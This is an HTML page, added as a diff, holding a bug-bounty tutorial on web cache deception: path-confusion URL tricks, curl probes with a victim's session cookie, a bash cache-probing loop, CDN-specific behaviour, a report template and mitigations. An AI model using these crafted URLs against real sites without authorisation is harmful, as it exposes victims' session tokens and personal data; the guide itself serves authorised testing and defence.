@@ -1,0 +1,830 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- ME1: Dark mode — runs before render to prevent FOUC -->
+    <script>
+      (function() {
+        var saved = localStorage.getItem('theme');
+        if (saved) {
+          document.documentElement.setAttribute('data-theme', saved);
+        } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+          document.documentElement.setAttribute('data-theme', 'dark');
+          localStorage.setItem('theme', 'dark');
+        }
+      })();
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Exploit web cache deception to steal authenticated content through CDN and reverse proxy misconfigurations. Covers path confusion, cache key manipulation, and detection.">
+    <title>Web Cache Deception Attacks: Stealing Authenticated Content Through CDN Misconfigs</title>
+    
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://bughuntertools.com/articles/web-cache-deception-bug-bounty-guide-2026/">
+    
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://bughuntertools.com/articles/web-cache-deception-bug-bounty-guide-2026/">
+    <meta property="og:title" content="Web Cache Deception Attacks: Stealing Authenticated Content Through CDN Misconfigs">
+    <meta property="og:description" content="Exploit web cache deception to steal authenticated content through CDN and reverse proxy misconfigurations. Covers path confusion, cache key manipulation, and detection.">
+    <meta property="og:site_name" content="Bug Hunter Tools">
+    
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://bughuntertools.com/articles/web-cache-deception-bug-bounty-guide-2026/">
+    <meta name="twitter:title" content="Web Cache Deception Attacks: Stealing Authenticated Content Through CDN Misconfigs">
+    <meta name="twitter:description" content="Exploit web cache deception to steal authenticated content through CDN and reverse proxy misconfigurations. Covers path confusion, cache key manipulation, and detection.">
+    
+    <!-- Google Fonts: Inter (UI) + JetBrains Mono (code) -->
+    <link rel="stylesheet" href="/css/fonts.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-PP6M3SZSVR"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-PP6M3SZSVR');
+    </script>
+    
+    <!-- AI Agent Referrer Tracking -->
+    <script>
+      (function() {
+        var ua = navigator.userAgent || '';
+        var ref = document.referrer || '';
+        var aiSource = null;
+        
+        // Detect AI agents by User-Agent
+        if (ua.includes('ChatGPT-User') || ua.includes('ChatGPT')) {
+          aiSource = 'chatgpt';
+        } else if (ua.includes('Claude') || ua.includes('Anthropic')) {
+          aiSource = 'claude';
+        } else if (ua.includes('PerplexityBot') || ua.includes('Perplexity')) {
+          aiSource = 'perplexity';
+        } else if (ua.includes('GPTBot')) {
+          aiSource = 'openai_crawler';
+        } else if (ua.includes('ClaudeBot') || ua.includes('anthropic-ai')) {
+          aiSource = 'anthropic_crawler';
+        } else if (ua.includes('Bard') || ua.includes('Gemini')) {
+          aiSource = 'google_gemini';
+        } else if (ref.includes('chat.openai.com')) {
+          aiSource = 'chatgpt_referrer';
+        } else if (ref.includes('claude.ai')) {
+          aiSource = 'claude_referrer';
+        } else if (ref.includes('perplexity.ai')) {
+          aiSource = 'perplexity_referrer';
+        }
+        
+        // Send custom event if AI agent detected
+        if (aiSource) {
+          gtag('event', 'ai_agent_visit', {
+            'ai_source': aiSource,
+            'page_path': window.location.pathname,
+            'user_agent': ua
+          });
+          
+          // Set custom dimension
+          gtag('set', {'ai_visitor': aiSource});
+          
+          // Log to console for debugging
+          console.log('AI Agent detected:', aiSource);
+        }
+      })();
+    </script>
+    
+    <!-- Affiliate Link Click Tracking -->
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        // Track clicks on Amazon affiliate links (tag=altclaw-20)
+        var links = document.querySelectorAll('a[href*="amazon.com"][href*="altclaw-20"]');
+        links.forEach(function(link) {
+          link.addEventListener('click', function(e) {
+            var href = this.href;
+            var asin = (href.match(/\/dp\/([A-Z0-9]{10})/) || [])[1] || 'unknown';
+            var label = this.textContent.trim().substring(0, 60) || asin;
+            gtag('event', 'affiliate_click', {
+              'event_category': 'affiliate',
+              'event_label': label,
+              'affiliate_product': asin,
+              'affiliate_program': 'amazon',
+              'page_path': window.location.pathname
+            });
+          });
+        });
+      });
+    </script>
+
+    <!-- Google AdSense Verification -->
+    <meta name="google-adsense-account" content="ca-pub-9373816755142401">
+
+    <!-- Google AdSense -->
+    
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9373816755142401" crossorigin="anonymous"></script>
+    
+
+    <!-- Schema.org markup -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebPage",
+      "name": "Web Cache Deception Attacks: Stealing Authenticated Content Through CDN Misconfigs",
+      "description": "Exploit web cache deception to steal authenticated content through CDN and reverse proxy misconfigurations. Covers path confusion, cache key manipulation, and detection.",
+      "url": "https://bughuntertools.com/articles/web-cache-deception-bug-bounty-guide-2026/"
+    }
+    </script>
+</head>
+<body>
+    <!-- Sticky Navigation Bar -->
+    <div class="sticky-nav">
+        <div class="container sticky-nav-inner">
+            <a href="/" class="sticky-nav-logo">🔍 Bug Hunter Tools</a>
+            <div class="sticky-nav-links">
+                <a href="/">Home</a>
+                <a href="/articles/">Articles</a>
+                <a href="/categories/">Categories</a>
+                <a href="/demos/">SecurityClaw Demos</a>
+                <a href="/articles/security-testing-tools-2026/">Tools</a>
+                <a href="/about/">About</a>
+                <a href="/privacy.html">Privacy</a>
+            </div>
+            <button class="dark-mode-toggle" aria-label="Toggle dark mode">🌙</button>
+        </div>
+    </div>
+
+    
+    <!-- Breadcrumb Navigation -->
+    <nav class="breadcrumb" aria-label="Breadcrumb">
+        <div class="container">
+            <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/">
+                        <span itemprop="name">Home</span>
+                    </a>
+                    <meta itemprop="position" content="1" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/articles/">
+                        <span itemprop="name">Articles</span>
+                    </a>
+                    <meta itemprop="position" content="2" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <span itemprop="name">Web Cache Deception Attacks: Stealing Authenticated Content Through CDN Misconfigs</span>
+                    <meta itemprop="position" content="3" />
+                </li>
+            </ol>
+        </div>
+    </nav>
+    
+
+    
+
+    <main class="container">
+        
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Article",
+  "headline": "Web Cache Deception for Bug Bounty in 2026: How to Find and Exploit Cache Deception Vulnerabilities in Real Targets",
+  "description": "Learn how to find and exploit web cache deception vulnerabilities in bug bounty programs. Covers path confusion attacks, CDN-specific behaviors, cache key manipulation, and real-world exploitation techniques for 2026.",
+  "datePublished": "2026-04-15",
+  "dateModified": "2026-04-15",
+  "author": {
+    "@type": "Organization",
+    "name": "BugHunterTools"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "BugHunterTools",
+    "url": "https://bughuntertools.com"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://bughuntertools.com/articles/web-cache-deception-bug-bounty-guide-2026/"
+  }
+}
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "FAQPage",
+  "mainEntity": [
+    {
+      "@type": "Question",
+      "name": "What is web cache deception and how does it differ from cache poisoning?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Web cache deception tricks a cache into storing a victim's private, dynamic response under a publicly accessible URL. The attacker crafts a URL that the origin server treats as a dynamic page (serving user-specific content) but the cache treats as a static, cacheable resource. Cache poisoning, by contrast, injects malicious content into a cached response that is then served to other users. Deception steals data; poisoning delivers payloads."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Which CDNs and caching layers are most susceptible to web cache deception?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Any CDN or reverse proxy that determines cacheability based on the URL path extension — such as Cloudflare, Akamai, Fastly, AWS CloudFront, and Varnish — can be susceptible if the origin server ignores or strips the appended path segment. The vulnerability arises from a mismatch between how the cache and the origin interpret the URL, not from a flaw in any single CDN product."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "How do I test for web cache deception in a bug bounty target?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Identify authenticated pages that return user-specific content (account settings, dashboards, profile pages). Append a static-looking path segment like /nonexistent.css or /test.js to the URL. Request the crafted URL while authenticated and check if the response still contains your private data. Then request the same URL from an unauthenticated browser — if the private data is served from cache, the target is vulnerable."
+      }
+    }
+  ]
+}
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {"@type": "ListItem", "position": 1, "name": "Home", "item": "https://bughuntertools.com/"},
+    {"@type": "ListItem", "position": 2, "name": "Articles", "item": "https://bughuntertools.com/articles/"},
+    {"@type": "ListItem", "position": 3, "name": "Web Cache Deception for Bug Bounty in 2026"}
+  ]
+}
+</script>
+
+<div class="key-takeaways">
+<h2>Key Takeaways</h2>
+<ul>
+<li>Web cache deception exploits a mismatch between how the origin server and the caching layer interpret a URL — the origin serves dynamic content while the cache stores it as static</li>
+<li>A single successful cache deception attack can expose session tokens, PII, CSRF tokens, and account data for any victim who clicks a crafted link</li>
+<li>Path confusion techniques — appending <code>/profile/settings/x.css</code>, using path parameters, or encoding tricks — are the primary attack vectors</li>
+<li>Testing requires only a browser and an understanding of the target's caching behavior — no specialized tools needed</li>
+<li>Severity is typically High to Critical because it enables account takeover at scale with zero victim interaction beyond clicking a link</li>
+</ul>
+</div>
+
+## What Is Web Cache Deception?
+
+Web cache deception (WCD) is an attack where an adversary tricks a caching layer into storing a victim's private, dynamic response under a URL that the cache considers publicly cacheable. Once cached, anyone — including the attacker — can request that URL and receive the victim's sensitive data.
+
+The attack was first documented by Omer Gil in 2017, but it remains widely exploitable in 2026 because modern CDN configurations, microservice architectures, and framework routing behaviors continue to create the exact mismatch WCD requires.
+
+### Cache Deception vs. Cache Poisoning
+
+These two cache attacks are often confused but work in opposite directions:
+
+| | Cache Deception | Cache Poisoning |
+|---|---|---|
+| **Goal** | Steal victim's private data from cache | Inject attacker's payload into cache |
+| **Who is harmed** | The victim whose data is cached | Users who receive the poisoned response |
+| **Mechanism** | Trick cache into storing dynamic response | Trick cache into storing malicious response |
+| **Attacker controls** | The URL path | Request headers or unkeyed inputs |
+
+For cache poisoning techniques, see our [HTTP Parameter Pollution guide](/articles/http-parameter-pollution-bug-bounty-guide-2026/).
+
+## How Web Cache Deception Works
+
+The attack relies on a fundamental disagreement between two components:
+
+1. **The origin server** receives a request for `/account/settings/nonexistent.css` and — because of its routing logic — ignores the trailing path segment and serves the dynamic `/account/settings` page with the authenticated user's data.
+
+2. **The caching layer** sees the `.css` extension in the URL and decides this is a static asset that should be cached and served to subsequent requesters.
+
+### Attack Flow
+
+```
+1. Attacker crafts URL: https://target.com/account/settings/x.css
+2. Attacker sends this link to victim (phishing, social engineering, embedded in page)
+3. Victim clicks link while authenticated
+4. Origin server serves victim's /account/settings page (ignores /x.css)
+5. CDN caches the response because the URL ends in .css
+6. Attacker requests https://target.com/account/settings/x.css
+7. CDN serves cached response containing victim's private data
+```
+
+## Path Confusion Techniques
+
+The core of WCD exploitation is finding a URL structure that the origin and cache interpret differently. Here are the primary techniques:
+
+### 1. Static Extension Appending
+
+The simplest approach — append a cacheable file extension to a dynamic endpoint:
+
+```
+https://target.com/api/me/profile.css
+https://target.com/dashboard/settings.js
+https://target.com/account/billing.png
+https://target.com/user/notifications.svg
+```
+
+This works when the origin framework uses path-prefix routing (e.g., `/account/*` routes to the account controller regardless of what follows).
+
+### 2. Path Parameter Injection
+
+Some frameworks support path parameters using semicolons, which caches may ignore:
+
+```
+https://target.com/account/settings;x.css
+https://target.com/profile;cachebust=1.js
+```
+
+Tomcat, Jetty, and some Spring Boot configurations parse semicolons as path parameters. The CDN sees `.css` and caches; the origin sees `/account/settings` with a discarded parameter.
+
+### 3. Encoded Path Separators
+
+URL-encoded characters can create path confusion:
+
+```
+https://target.com/account/settings%2fx.css
+https://target.com/account/settings%23.css
+```
+
+If the cache normalizes `%2f` to `/` but the origin does not (or vice versa), the two components disagree on the path structure.
+
+### 4. Dot Segment Abuse
+
+Path traversal segments that resolve differently:
+
+```
+https://target.com/static/../account/settings
+https://target.com/account/settings/./cacheable.css
+```
+
+### 5. Filename Injection in REST APIs
+
+REST APIs that ignore trailing path segments:
+
+```
+https://target.com/api/v2/user/me/avatar.png
+https://target.com/api/v2/user/profile/photo.jpg
+```
+
+## Identifying Vulnerable Targets
+
+### Step 1: Map Authenticated Dynamic Endpoints
+
+Look for pages that return user-specific content:
+
+- Account settings / profile pages
+- Dashboard views
+- API endpoints returning user data (`/api/me`, `/api/user/profile`)
+- Order history, billing pages
+- Notification feeds
+
+### Step 2: Identify the Caching Layer
+
+Determine what sits between you and the origin:
+
+- Check response headers: `X-Cache`, `CF-Cache-Status`, `X-Varnish`, `Age`, `X-CDN`
+- Look for `Via` headers indicating proxy chains
+- Check `Cache-Control` and `Vary` headers to understand caching rules
+- Use `curl -I` to inspect headers without rendering
+
+```bash
+curl -sI https://target.com/account/settings | grep -iE 'cache|cdn|via|age|x-varnish|cf-'
+```
+
+### Step 3: Test Path Confusion
+
+For each dynamic endpoint, try appending static extensions and check:
+
+1. Does the origin still serve the dynamic content? (Check response body)
+2. Does the cache store it? (Check `X-Cache: HIT` on second request)
+
+```bash
+# First request — should be a MISS, response contains private data
+curl -s -H "Cookie: session=VICTIM_TOKEN" \
+  https://target.com/account/settings/x.css | head -50
+
+# Second request — unauthenticated, check for HIT
+curl -sI https://target.com/account/settings/x.css | grep -i cache
+```
+
+## CDN-Specific Behaviors
+
+### Cloudflare
+
+Cloudflare caches based on file extension by default. Extensions like `.css`, `.js`, `.png`, `.jpg`, `.svg`, `.woff2` are cached automatically. Test with:
+
+```
+/dynamic-page/test.css
+/dynamic-page/test.png
+```
+
+Check `CF-Cache-Status: HIT` in response headers.
+
+### Akamai
+
+Akamai's caching rules are highly configurable per property. Look for:
+- Default caching rules based on extension
+- `X-Cache: TCP_HIT` or `X-Cache: TCP_MISS`
+- Path-based caching rules that may be overly broad
+
+### AWS CloudFront
+
+CloudFront caching depends on behavior patterns configured in the distribution. Common misconfigurations:
+- Wildcard path patterns (`/*.css`) that match appended extensions
+- Missing `Cache-Control: no-store` on dynamic endpoints
+- Check `X-Cache: Hit from cloudfront`
+
+### Varnish
+
+Varnish configurations often cache based on URL patterns in VCL:
+
+```
+if (req.url ~ "\.(css|js|png|jpg|gif|svg)$") {
+    return (hash);
+}
+```
+
+This regex matches any URL ending in these extensions — including `/account/settings/x.css`.
+
+## Real-World Exploitation Scenarios
+
+### Scenario 1: Account Takeover via Cached Session Token
+
+If the dynamic page includes a CSRF token or session identifier in the HTML:
+
+```html
+<meta name="csrf-token" content="abc123secret">
+<script>window.USER_TOKEN = "eyJhbG...";</script>
+```
+
+The attacker retrieves the cached page, extracts the token, and uses it to perform actions as the victim.
+
+### Scenario 2: PII Exfiltration
+
+Account pages often display:
+- Email addresses
+- Phone numbers
+- Billing addresses
+- Partial payment information
+- API keys or webhook URLs
+
+A cached response exposes all of this to the attacker.
+
+### Scenario 3: Chaining with Open Redirect
+
+If the target has an open redirect, the attacker can chain it:
+
+```
+https://target.com/redirect?url=/account/settings/x.css
+```
+
+The victim follows the redirect, their authenticated response gets cached, and the attacker retrieves it.
+
+## Automation and Tooling
+
+### Manual Testing Script
+
+```bash
+#!/bin/bash
+TARGET="https://target.com"
+ENDPOINTS=("/account/settings" "/api/me" "/dashboard" "/profile")
+EXTENSIONS=(".css" ".js" ".png" ".svg" ".ico")
+
+for endpoint in "${ENDPOINTS[@]}"; do
+  for ext in "${EXTENSIONS[@]}"; do
+    url="${TARGET}${endpoint}/cachebust${RANDOM}${ext}"
+    status=$(curl -sI "$url" | grep -i "cf-cache-status\|x-cache" | head -1)
+    echo "$url → $status"
+  done
+done
+```
+
+### Burp Suite Approach
+
+1. Browse the target while authenticated — map all dynamic endpoints
+2. For each endpoint, use Intruder to append static extensions
+3. Check responses for: (a) dynamic content still present, (b) cache headers indicating storage
+4. Replay without cookies to confirm cached data is accessible
+
+### Nuclei Template
+
+The Nuclei project includes web cache deception detection templates. Run:
+
+```bash
+nuclei -u https://target.com -t http/vulnerabilities/web-cache-deception.yaml
+```
+
+## Writing the Bug Bounty Report
+
+### Severity Justification
+
+Web cache deception is typically rated **High** or **Critical**:
+
+- **Critical**: If cached responses contain session tokens, API keys, or data enabling account takeover
+- **High**: If cached responses expose PII or sensitive account data
+- **Medium**: If cached responses expose non-sensitive but private user data
+
+### Report Template
+
+```
+## Title
+Web Cache Deception on [endpoint] exposes authenticated user data via CDN caching
+
+## Summary
+The endpoint [URL] is vulnerable to web cache deception. By appending a static
+file extension to the URL path, an attacker can trick the CDN into caching the
+authenticated response, then retrieve the victim's private data.
+
+## Steps to Reproduce
+1. Log in to the application
+2. Visit: [crafted URL]
+3. Note the response contains your private account data
+4. Open a private/incognito browser (no cookies)
+5. Visit the same URL
+6. Observe the cached response contains the victim's private data
+
+## Impact
+An attacker can steal [specific data: session tokens, PII, CSRF tokens] from
+any authenticated user who clicks a crafted link. This enables [account takeover /
+data exfiltration] at scale.
+
+## Remediation
+- Configure the CDN to respect origin Cache-Control headers
+- Add Cache-Control: no-store to all authenticated endpoints
+- Validate URL paths strictly — return 404 for unexpected path segments
+- Use cache keys that include authentication state
+```
+
+## Defenses and Mitigations
+
+Understanding defenses helps you identify when they're incomplete:
+
+1. **Strict Cache-Control headers**: `Cache-Control: no-store, private` on all authenticated responses
+2. **Path validation**: Origin returns 404 for unexpected trailing path segments
+3. **Cache key includes Vary: Cookie**: Cache stores separate entries per session (but this has performance implications)
+4. **CDN configuration**: Only cache responses from explicitly designated static asset paths, not based on URL extension
+5. **Content-Type validation**: CDN only caches responses where the `Content-Type` matches the expected type for the file extension
+
+When testing, check if any of these defenses are partially implemented — partial defenses often have bypasses.
+
+## Related Techniques
+
+- [HTTP Parameter Pollution](/articles/http-parameter-pollution-bug-bounty-guide-2026/) — another technique exploiting parser differentials
+- [Prototype Pollution](/articles/prototype-pollution-bug-bounty-guide-2026/) — client-side attacks that can chain with cache deception
+- [GraphQL Subscription Abuse](/articles/graphql-subscription-abuse-bug-bounty-guide-2026/) — API-layer attacks on modern architectures
+- [WebSocket Security Testing](/articles/websocket-security-testing-bug-bounty-guide-2026/) — testing real-time communication layers
+
+## Conclusion
+
+Web cache deception remains one of the most impactful and underreported vulnerability classes in bug bounty. The attack requires minimal tooling, chains well with other vulnerabilities, and consistently yields high-severity findings. As CDN adoption continues to grow and microservice architectures add more routing layers, the attack surface for path confusion only increases.
+
+Focus your testing on authenticated endpoints behind CDNs, experiment with multiple path confusion techniques per target, and always verify the cached response is accessible without authentication before reporting.
+
+
+        
+        
+        <div class="ad-container ad-below-article">
+            <p class="ad-label">Advertisement</p>
+            <ins class="adsbygoogle"
+                 style="display:block"
+                 data-ad-client="ca-pub-9373816755142401"
+                 data-ad-slot="9879569728"
+                 data-ad-format="auto"
+                 data-full-width-responsive="true"></ins>
+            <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+        </div>
+        
+        
+    </main>
+
+    <footer>
+        <div class="container footer-inner">
+            <span class="footer-updated">Last updated: 16 Apr 2026, 08:48 GMT</span>
+            <p>&copy; 2026 Bug Hunter Tools. All rights reserved. | <a href="/privacy.html" style="color: white;">Privacy Policy</a></p>
+        </div>
+    </footer>
+
+    <!-- ME1: Dark mode toggle handler -->
+    <script>
+      (function() {
+        var btn = document.querySelector('.dark-mode-toggle');
+        if (!btn) return;
+        function updateBtn() {
+          var dark = document.documentElement.getAttribute('data-theme') === 'dark';
+          btn.textContent = dark ? '☀️' : '🌙';
+          btn.setAttribute('aria-label', dark ? 'Switch to light mode' : 'Switch to dark mode');
+        }
+        updateBtn();
+        btn.addEventListener('click', function() {
+          var next = (document.documentElement.getAttribute('data-theme') === 'dark') ? 'light' : 'dark';
+          document.documentElement.setAttribute('data-theme', next);
+          localStorage.setItem('theme', next);
+          updateBtn();
+        });
+      })();
+    </script>
+
+    <!-- ME2: Article hero header + reading time badge -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = path.startsWith('/articles/') && path !== '/articles/';
+        var isDemo    = path.startsWith('/demos/')    && path !== '/demos/';
+        if (!isArticle && !isDemo) return;
+        var article = document.querySelector('article');
+        if (!article) return;
+        var text  = article.innerText || '';
+        var words = text.trim().split(/\s+/).filter(Boolean).length;
+        var mins  = Math.max(1, Math.round(words / 238));
+        var badge = '<span class="reading-time-badge">&#9201; ' + mins + ' min read</span>';
+        var header = article.querySelector('header');
+        if (!header) return;
+        header.classList.add('article-hero-header');
+        var metaEl = header.querySelector('.meta, .article-meta');
+        if (metaEl) {
+          metaEl.classList.add('article-hero-meta');
+          metaEl.insertAdjacentHTML('beforeend', ' &middot; ' + badge);
+        } else {
+          var h1 = header.querySelector('h1');
+          if (h1) {
+            var div = document.createElement('div');
+            div.className = 'article-hero-meta';
+            div.innerHTML = badge;
+            header.appendChild(div);
+          }
+        }
+      })();
+    </script>
+
+    <!-- BR2: Sidebar Table of Contents — IntersectionObserver highlight -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        // Build the ToC from headings/sections inside article
+        function buildSidebarToC() {
+          var article = document.querySelector('article');
+          if (!article) return;
+
+          // Collect anchor targets + labels.
+          // Support two patterns:
+          //   (a) <h2 id="..."> / <h3 id="..."> — explicit IDs on headings
+          //   (b) <section id="..."><h2>...</h2> — IDs on parent sections (older articles)
+          var entries = [];
+
+          // Pass (a): headings with own IDs
+          article.querySelectorAll('h2[id], h3[id]').forEach(function(h) {
+            entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+          });
+
+          // Pass (b): sections with IDs whose h2 has no id yet
+          if (entries.length < 3) {
+            entries = [];
+            article.querySelectorAll('section[id]').forEach(function(sec) {
+              var h = sec.querySelector('h2, h3');
+              if (!h) return;
+              // Ensure heading has the id so IntersectionObserver works
+              if (!h.id) h.id = sec.id;
+              entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+            });
+          }
+
+          if (entries.length < 3) return; // not worth showing
+
+          // Add has-toc-sidebar class to main
+          var mainEl = document.querySelector('main');
+          if (mainEl) mainEl.classList.add('has-toc-sidebar');
+
+          // Build sidebar element
+          var sidebar = document.createElement('nav');
+          sidebar.className = 'toc-sidebar';
+          sidebar.setAttribute('aria-label', 'Table of contents');
+
+          var header = document.createElement('div');
+          header.className = 'toc-sidebar-header';
+          header.textContent = 'In this article';
+          sidebar.appendChild(header);
+
+          var list = document.createElement('ul');
+          list.className = 'toc-sidebar-list';
+
+          entries.forEach(function(e) {
+            var li = document.createElement('li');
+            li.className = 'toc-sidebar-item' + (e.level === 'H3' ? ' toc-sidebar-item--sub' : '');
+            li.setAttribute('data-heading-id', e.id);
+
+            var a = document.createElement('a');
+            a.href = '#' + e.id;
+            a.textContent = e.text.replace(/^[0-9]+\.\s*/, ''); // strip leading "1. "
+            li.appendChild(a);
+            list.appendChild(li);
+          });
+
+          sidebar.appendChild(list);
+
+          // Append sidebar to main (grid places it to the right)
+          if (mainEl) mainEl.appendChild(sidebar);
+
+          // IntersectionObserver — highlight active heading
+          var items = sidebar.querySelectorAll('.toc-sidebar-item[data-heading-id]');
+          var activeId = null;
+
+          var observer = new IntersectionObserver(function(entries) {
+            entries.forEach(function(entry) {
+              if (entry.isIntersecting) {
+                activeId = entry.target.id;
+              }
+            });
+
+            items.forEach(function(item) {
+              item.classList.toggle(
+                'toc-sidebar-item--active',
+                item.getAttribute('data-heading-id') === activeId
+              );
+            });
+          }, {
+            rootMargin: '-20% 0px -75% 0px',
+            threshold: 0
+          });
+
+          entries.forEach(function(e) { observer.observe(e.el); });
+
+          // Smooth scroll for sidebar links
+          sidebar.addEventListener('click', function(e) {
+            var a = e.target.closest('a');
+            if (!a) return;
+            var id = a.getAttribute('href').replace('#', '');
+            var target = document.getElementById(id);
+            if (target) {
+              e.preventDefault();
+              target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+              history.replaceState(null, '', '#' + id);
+            }
+          });
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', buildSidebarToC);
+        } else {
+          buildSidebarToC();
+        }
+      })();
+    </script>
+
+    <!-- ME3: Inline ad injection — inserts 2 ads per article (post-intro + mid-article) -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        var pubId  = 'ca-pub-9373816755142401';
+        var slotId = '9879569728';
+        if (!pubId || !slotId) return;
+
+        function createAdUnit(label) {
+          var wrapper = document.createElement('div');
+          wrapper.className = 'ad-container ad-inline';
+          wrapper.setAttribute('data-ad-label', label);
+          wrapper.innerHTML =
+            '<ins class="adsbygoogle"' +
+            ' style="display:block"' +
+            ' data-ad-client="' + pubId + '"' +
+            ' data-ad-slot="' + slotId + '"' +
+            ' data-ad-format="auto"' +
+            ' data-full-width-responsive="true"></ins>';
+          return wrapper;
+        }
+
+        function injectAds() {
+          var article = document.querySelector('article');
+          if (!article) return;
+
+          var allP = article.querySelectorAll('p');
+          if (allP.length < 6) return;
+
+          // Ad 1: after paragraph 3 (post-intro)
+          var introTarget = allP[2];
+          if (introTarget && introTarget.parentNode) {
+            var ad1 = createAdUnit('post-intro');
+            introTarget.parentNode.insertBefore(ad1, introTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+
+          // Re-query after first insertion, place mid-article ad
+          allP = article.querySelectorAll('p');
+          var midIdx = Math.floor(allP.length / 2);
+          if (midIdx < 6) midIdx = 6;
+          var midTarget = allP[midIdx];
+          if (midTarget && midTarget.parentNode) {
+            var ad2 = createAdUnit('mid-article');
+            midTarget.parentNode.insertBefore(ad2, midTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', injectAds);
+        } else {
+          injectAds();
+        }
+      })();
+    </script>
+</body>
+</html>
